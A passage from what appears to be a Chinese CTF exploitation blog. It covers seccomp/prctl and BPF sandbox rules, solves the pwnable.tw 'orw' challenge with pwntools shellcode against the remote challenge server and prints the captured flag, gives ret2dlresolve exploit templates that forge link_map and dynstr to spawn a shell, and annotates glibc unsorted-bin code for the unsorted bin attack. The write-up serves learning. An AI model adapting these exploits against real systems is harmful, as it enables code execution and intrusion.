unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); \n\n函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：\nPR_SET_NO_NEW_PRIVSPR_SET_SECCOMP\n\n先来看第一个，PR_SET_NO_NEW_PRIVS：\nSet the calling thread's no_new_privs attribute to thevalue in arg2.  With no_new_privs set to 1, execve(2)promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (forexample, rendering the set-user-ID and set-group-ID modebits, and file capabilities non-functional).  Once set,the no_new_privs attribute cannot be unset.  The settingof this attribute is inherited by children created byfork(2) and clone(2), and preserved across execve(2).\n\n简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);     //设为1\n\n\nhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。\n\n在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。\n\n接着看第二个options PR_SET_SECCOMP：\n\nSet the secure computing (seccomp) mode for the calling thread, \nto limit the available system calls.\n\n一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。常常与它在prctl出现的还有如下两个参数：\nSECCOMP_MODE_STRICT：    the only system calls that the thread is permitted to make are read(2),\twrite(2),_exit(2) (but not exit_group(2)), and sigreturn(2). SECCOMP_MODE_FILTER (since Linux 3.5)：    the system calls allowed are defined by a pointer to a Berkeley Packet     Filter passed in arg3.  This argument is a pointer to struct sock_fprog; \tit can be designed to filter arbitrary system calls and system call arguments.  1、SECCOMP_MODE*STRICT(1)：\t允许线程进行的唯一系统调用是read（2），write（2），*exit（2）（但不是exit_group（2））    和sigreturn（2）。2、SECCOMP_MODE_FILTER(2) (since Linux 3.5)：    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。     这个参数是一个指向struct sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数\n\n上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。将这几个参数带入到prctl：\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，\n\n其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：\nprctl(22, 2, &amp;v1);//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）\n\n上面v1所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v1所定义的规则：\n.rodata:08048640 20                            unk_8048640 db  20h                     ; DATA XREF: orw_seccomp+17↑o.rodata:08048641 00                            db    0.rodata:08048642 00                            db    0.rodata:08048643 00                            db    0.rodata:08048644 04                            db    4.rodata:08048645 00                            db    0.rodata:08048646 00                            db    0.rodata:08048647 00                            db    0.rodata:08048648 15                            db  15h.rodata:08048649 00                            db    0.rodata:0804864A 00                            db    0.rodata:0804864B 09                            db    9.rodata:0804864C 03                            db    3.rodata:0804864D 00                            db    0.rodata:0804864E 00                            db    0.rodata:0804864F 40                            db  40h ; @.rodata:08048650 20                            db  20h.rodata:08048651 00                            db    0.rodata:08048652 00                            db    0.rodata:08048653 00                            db    0.rodata:08048654 00                            db    0.rodata:08048655 00                            db    0.rodata:08048656 00                            db    0.rodata:08048657 00                            db    0.rodata:08048658 15                            db  15h.rodata:08048659 00                            db    0.rodata:0804865A 07                            db    7.rodata:0804865B 00                            db    0.rodata:0804865C AD                            db 0ADh\n\n好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW    \n\n\n从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？\n\nBPF 规则介绍Q：BPF是数据链路层上的一种接口，它怎么会出现在系统调用中？\nA：其实这原本是TCP协议包的过滤规则格式，后面被引用为沙箱规则。\n\n简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。\n&amp;prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:\nstruct sock_fprog {   unsigned short      len;    /* Number of BPF instructions */   struct sock_filter *filter; /* Pointer to array of BPF instructions */};\n\n而filter域就指向了具体的规则，每一条规则有如下形式：\nstruct sock_filter {            /* Filter block */    __u16 code;                 /* Actual filter code */    __u8  jt;                   /* Jump true */    __u8  jf;                   /* Jump false */    __u32 k;                    /* Generic multiuse field */};\n\n为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：\n#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif\n\n样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：\n#define BPF_CLASS(code) ((code) &amp; 0x07)         //首先指定操作的类别#define\t\tBPF_LD\t\t0x00                    //将值cp进寄存器#define\t\tBPF_LDX\t\t0x01#define\t\tBPF_ST\t\t0x02#define\t\tBPF_STX\t\t0x03#define\t\tBPF_ALU\t\t0x04#define\t\tBPF_JMP\t\t0x05#define\t\tBPF_RET\t\t0x06#define\t\tBPF_MISC    0x07\t/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)         //在ld时指定操作数的大小#define\t\tBPF_W\t\t0x00#define\t\tBPF_H\t\t0x08#define\t\tBPF_B\t\t0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)         //操作数类型#define\t\tBPF_IMM\t\t0x00#define\t\tBPF_ABS\t\t0x20#define\t\tBPF_IND\t\t0x40#define\t\tBPF_MEM\t\t0x60#define\t\tBPF_LEN\t\t0x80#define\t\tBPF_MSH\t\t0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)         //当操作码类型为ALU时，指定具体运算符#define\t\tBPF_ADD\t\t0x00                    //到底执行什么操作可以看filter.h里面的定义#define\t\tBPF_SUB\t\t0x10#define\t\tBPF_MUL\t\t0x20#define\t\tBPF_DIV\t\t0x30#define\t\tBPF_OR\t\t0x40#define\t\tBPF_AND\t\t0x50#define\t\tBPF_LSH\t\t0x60#define\t\tBPF_RSH\t\t0x70#define\t\tBPF_NEG\t\t0x80#define\t\tBPF_MOD\t\t0x90#define\t\tBPF_XOR\t\t0xa0#define\t\tBPF_JA\t\t0x00                    //当操作码类型是JMP时指定跳转类型#define\t\tBPF_JEQ\t\t0x10#define\t\tBPF_JGT\t\t0x20#define\t\tBPF_JGE\t\t0x30#define\t\tBPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)         #define\t\tBPF_K\t\t0x00                    //常数#define\t\tBPF_X\t\t0x08\n\n另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：\nstruct seccomp_data {    int   nr;                   /* System call number */    __u32 arch;                 /* AUDIT_ARCH_* value                                  (在 &lt;linux/audit.h&gt; 里) */    __u64 instruction_pointer;  /* CPU instruction pointer */    __u64 args[6];              /* Up to 6 system call arguments */};\n\n其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0)//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据//或者BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))\n\n而跳转语句写法如下：\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,1,0)               //这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转\n\n其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。最后当验证完成需要返回结果，即是否允许：\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)\n\n过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。总结一下：\n\n结构赋值操作指令为：BPF_STMT、BPF_JUMP\nBPF 的主要指令有 BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令\nBPF 条件判断跳转指令：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。\n返回指令：BPF_RET、BPF_K，返回后面参数的值\n\n例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）\nstruct sock_filter filter[] = {    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),          // 从第0个字节位置开始，加载读取系统调用号    BPF_JUMP(BPF_JMP|BPF_JEQ, 257, 1, 0),       // 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行    BPF_JUMP(BPF_JMP|BPF_JGE, 0, 1, 0),         // 比较系统调用号是否大于 0，是就跳到第6行    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), // 拒绝系统调用，返回 0    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), // 允许系统调用};\n\n拿本题的sock_filter结构体说明一下：\n line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n\nline 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。line 8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。\n开始解题经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。老规矩，检查一下文件的保护机制：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww[*] '/mnt/hgfs/PWN\\xe9\\xa2\\x98/Range/pwnable.xyz/orww'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n\n可以看到程序为32位，只开启了NX保护。main函数如下：\nint __cdecl main(int argc, const char **argv, const char **envp){  orw_seccomp();  printf(\"Give my your shellcode:\");  read(0, &amp;shellcode, 0xC8u);  ((void (*)(void))shellcode)();  return 0;}\n\n很简单，输入shellcode之后程序就会执行它。还有一个问题，system和execve都被禁用了怎么办？读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。同时题目已经给予了这个提示：\n因此这里考验我们直接编写shellcode的能力，这里注意• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。由于这道题是32位程序，因此编写shellcode如下：\nfrom pwn import *context.log_level=\"debug\"p = remote('chall.pwnable.tw', 10001)shellcode_open = 'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'shellcode_read = 'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'shellcode_write = 'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'shellcode = shellcode_open + shellcode_read + shellcode_writeshellcode = asm(shellcode)p.recvuntil(':')p.sendline(shellcode)print p.recv()p.interactive()'''shellcode说明：                   xor eax,eax      ;清空需要用到的寄存器xor ebx,ebxxor ecx,ecxxor edx,edx#fd = open('/home/orw/flag',0)push 0x00006761;           ;\"/home/orw/flag\"的十六进制push 0x6c662f77;           ;\"/home/orw/flag\"的十六进制push 0x726f2f65;           ;\"/home/orw/flag\"的十六进制push 0x6d6f682f;           ;\"/home/orw/flag\"的十六进制mov ebx, esp;              ;const char __user *filenamemov eax, 0x5;              ;open函数的系统调用：sys_openint 0x80;#read(fd,bss+0x200,0x40)mov ebx, eax;              ;int fdmov ecx, 0x0804A260;       ;void *bufmov edx, 0x40;             ;size_t countmov eax, 0x3;              ;read函数的系统调用：sys_readint 0x80;#write(1,bss+0x200,0x40)mov ebx, 0x1;              ;int fd=1 (标准输出stdout)(0 标准输入，1 标准输出，2 标准错误输出)mov ecx, 0x0804A260;       ;void *bufmov edx, 0x40;             ;size_t countmov eax, 0x4;              ;read函数的系统调用：sys_readint 0x80;'''\n\n➜  others python orw_exp.py [+] Opening connection to chall.pwnable.tw on port 10001: Done[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin[DEBUG] Assembling    .section .shellcode,\"awx\"    .global _start    .global __start    _start:    __start:    .intel_syntax noprefix    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-7bYAEr/step2 /tmp/pwn-asm-7bYAEr/step1[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7bYAEr/step3 /tmp/pwn-asm-7bYAEr/step4[DEBUG] Received 0x17 bytes:    'Give my your shellcode:'[DEBUG] Sent 0x4f bytes:    00000000  31 c0 31 db  31 c9 31 d2  68 61 67 00  00 68 77 2f  │1·1·│1·1·│hag·│·hw/│    00000010  66 6c 68 65  2f 6f 72 68  2f 68 6f 6d  89 e3 b8 05  │flhe│/orh│/hom│····│    00000020  00 00 00 cd  80 89 c3 b9  60 a2 04 08  ba 40 00 00  │····│····│`···│·@··│    00000030  00 b8 03 00  00 00 cd 80  bb 01 00 00  00 b9 60 a2  │····│····│····│··`·│    00000040  04 08 ba 40  00 00 00 b8  04 00 00 00  cd 80 0a     │···@│····│····│···│    0000004f[DEBUG] Received 0x40 bytes:    00000000  46 4c 41 47  7b 73 68 33  6c 6c 63 30  64 69 6e 67  │FLAG│{sh3│llc0│ding│    00000010  5f 77 31 74  68 5f 6f 70  33 6e 5f 72  33 34 64 5f  │_w1t│h_op│3n_r│34d_│    00000020  77 72 69 74  33 7d 0a 00  00 00 00 00  00 00 00 00  │writ│3}··│····│····│    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│    00000040\t\t\tFLAG{sh3llc0ding_w1th_op3n_r34d_writ3}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Switching to interactive mode[*] Got EOF while reading in interactive$ \n\nprctl是否能绕过？可以，但是不会\n","categories":["pwn 进阶"],"tags":["orw"]},{"title":"ret2dlresolve","url":"/2023/10/25/ret2dlresolve%E5%AD%A6%E4%B9%A0/","content":"借鉴文档：【精选】ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客\nx86前置知识在Linux中，程序使用_dl_runtime_resolve(link_map,reloc_offset)来对动态链接的函数进行重定位。\n而ret2dlresolve攻击的核心就是控制相应的参数及其对应地址的内容，从而控制解析的函数。\n延迟绑定机制第一次调用一个函数时，先是到plt表，然后jmp到got表\n\n此时got表存的地址是在plt表上\n\n其实也就是jmp got的下一条指令，这里先是push一个数字（该函数在rel.plt上的偏移,reloc_arg，后文会讲到），然后jmp到plt[0] (0x8048380)\n\n在plt[0]处先是push got[1]，got[1]就是link_map（链接器的标识信息,后文会讲到），然后jmp到got[2]处，got[2]就是_dl_runtime_resolve函数的地址\n\n\n所以相当于执行了\n_dl_runtime_resolve(link_map,reloc_arg)\n\n这个函数会完成符号的解析，即将真实的write函数地址写入其GOT表对应的条目中，随后将控制器交给被解析的函数\nx64NO RELROfrom pwn import *  context(os='linux',arch='amd64',log_level='debug')r = process('./')  elf = ELF('./')  read_plt = elf.plt['read']  #我们攻击的目标，.dynamic中strtab的地址，我们要在此处修改指向fake_dynstr  target_addr = 0x600988 + 8  #用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  #plt起始地址plt0_load =    #pop rdi;ret;  pop_rdi =  #pop rsi ; pop r15 ; ret  pop_rsi = #伪造dynstr  fake_dynstr = '\\x00libc.so.6\\x00stdin\\x00system\\x00' #原本dynstr为\\x00libc.so.6\\x00stdin\\x00strlen\\x00'#bss段起始地址bss =   offset = payload = flat('a' * offset , pop_rdi , 0 , pop_rsi , bss , 0 , read_plt , # 将'/bin/sh'以及伪造的strtab写入bss段                pop_rdi , 0 , pop_rsi , target_addr , 0 , read_plt , # 将.dynamic中的strtab地址改为我们伪造的strtab的地址                pop_rdi , bss , plt0_load , 1 # 调用.dl_fixup,解析strlen函数，由于我们已经在fake_strtab中将strlen替换成system，所以将会解析system函数)r.recvuntil('Welcome to XDCTF2015~!\\n')r.sendline(payload)  #发送system的参数以及伪造的strtabpayload2 = '/bin/sh'.ljust(0x10,'\\x00') + fake_dynstr  sleep(1)  r.sendline(payload2)  sleep(1)  #修改dynsym里的strtab的地址为我们伪造的dynstr的地址  r.sendline(p64(bss + 0x10))  r.interactive()  \n\nPARTIAL_RELROfrom pwn import *  context(os='linux',arch='amd64',log_level='debug')#r = gdb.debug(\"./parelro_x64\",'break main')r = process('./')  elf = ELF('./')  libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')  read_plt = elf.plt['read']  write_got = elf.got['write']  vuln_addr = elf.sym['vuln']    #bss  bss =   bss_stage = bss + 0x100l_addr =  libc.sym['system'] -libc.sym['write']  # l_addr = -769472, 通常为负数  pop_rdi =   #pop rsi ; pop r15 ; ret  pop_rsi =   #用于解析符号dl_runtime_resolve  plt0 = plt_load = plt0 + 6  def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):    # &amp;(2**64-1)是因为offset为负数，如果不控制范围，p64后会越界，发生错误    linkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr    # fake_linkmap_addr + 8，也就是DT_JMPREL，至于为什么有个0，可以参考IDA上.dyamisc的结构内容    linkmap += p64(0) # 可以为任意值    linkmap += p64(fake_linkmap_addr + 0x18) # 这里的值就是伪造的.rel.plt的地址    # fake_linkmap_addr + 0x18,fake_rel_write,因为write函数push的索引是0，也就是第一项    linkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1)) # Rela-&gt;r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可     linkmap += p64(0x7) # Rela-&gt;r_info,用于索引symtab上的对应项，7&gt;&gt;32=0，也就是指向symtab的第一项    linkmap += p64(0)# Rela-&gt;r_addend,任意值都行    linkmap += p64(0)#l_ns    # fake_linkmap_addr + 0x38, DT_SYMTAB     linkmap += p64(0) # 参考IDA上.dyamisc的结构    linkmap += p64(known_func_ptr - 0x8) # 这里的值就是伪造的symtab的地址,为已解析函数的got表地址-0x8    linkmap += b'/bin/sh\\x00'    linkmap = linkmap.ljust(0x68,b'A')    linkmap += p64(fake_linkmap_addr) # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域    linkmap += p64(fake_linkmap_addr + 0x38) # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址    linkmap = linkmap.ljust(0xf8,b'A')    linkmap += p64(fake_linkmap_addr + 0x8) # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址    return linkmapfake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)# 伪造link_mappayload = flat( 'a' * 120 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , read_plt , # 把link_map写到bss段上                pop_rsi , 0 ,0 , # 使栈十六字节对齐，不然调用不了system                pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引)r.recvuntil('Welcome to XDCTF2015~!\\n')  r.sendline(payload)  r.send(fake_link_map) r.interactive() \n\n","categories":["pwn 进阶"],"tags":["ret2dlresolve"]},{"url":"/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/","content":""},{"title":"unsorted bin","url":"/2023/09/14/unsorted%20bin%20attack/","content":"关于unsorted bin 和 unsorted bin attack前言unsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。\n\nglobal_max_fast是main_arena中控制最大fastbin大小的变量。\n\nunsotedbin 基本来源1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于MINSIZE，就会被放到unsortedbin中。\n\n举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中\n\n2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。\n\nconsolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，合并;因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。\n\nunsortedbin_attack 概述● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。\nunsortedbin_attack 效果● Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。\nunsortedbin 源码分析\n这里使用libc-2.23版本的源码下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。最重要的是最后的总结，记住就行了。\n\n#源码的第3470行-3597行         while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))\t\t#取链表尾部的chunk记作victim        {          bck = victim-&gt;bk;          #倒数第二个chunk记作bck          #接下来对victim的size位进行检查          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, \"malloc(): memory corruption\",                             chunk2mem (victim), av);          size = chunksize (victim);\t\t  #检查通过，计算victim得到实际chunk的大小          /*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.           */          if (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))              #假如说我们申请的malloc大小属于smallbin的范围，并且last_remainder是              #unsortedbin的唯一一个chunk时，优先使用这个chunk。                          {              #假若满足条件则对其进行切割和解链操作                            /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size))                {                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                }              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }\t\t  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。          #其中unsorted_chunks (av)-&gt;bk = bck;          #bck-&gt;fd = unsorted_chunks (av);          #是unsorted bin attack产生的原因，          #一旦我们绕过之前的检查到达这里，          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)          #即*(bck+0x10)=unsorted(av)。          /* remove from unsorted list */          #unsortedbin产生的原因：          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);\t\t  #          /* Take now instead of binning if exact fit */    \t  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。          if (size == nb)            {              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }                            /* place chunk in bin */\t\t  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，          #需要根据其size放入small bin或large bin的链，          #其中在后者实现中存在large bin attack，          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。          if (in_smallbin_range (size))            {              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            }          else            {              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              /* maintain large bins in sorted order */              if (fwd != bck)                {                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    {                      fwd = bck;                      bck = bck-&gt;bk;                      victim-&gt;fd_nextsize = fwd-&gt;fd;                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    }                  else                    {                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        {                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        }                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)                        /* Always insert in the second position.  */                        fwd = fwd-&gt;fd;                      else                        {                          victim-&gt;fd_nextsize = fwd;                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                        }                      bck = fwd-&gt;bk;                    }                }              else                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            }          mark_bin (av, victim_index);          victim-&gt;bk = bck;          victim-&gt;fd = fwd;          fwd-&gt;bk = victim;          bck-&gt;fd = victim;#define MAX_ITERS       10000          if (++iters &gt;= MAX_ITERS)            break;        }\n\nunsortedbin_attack 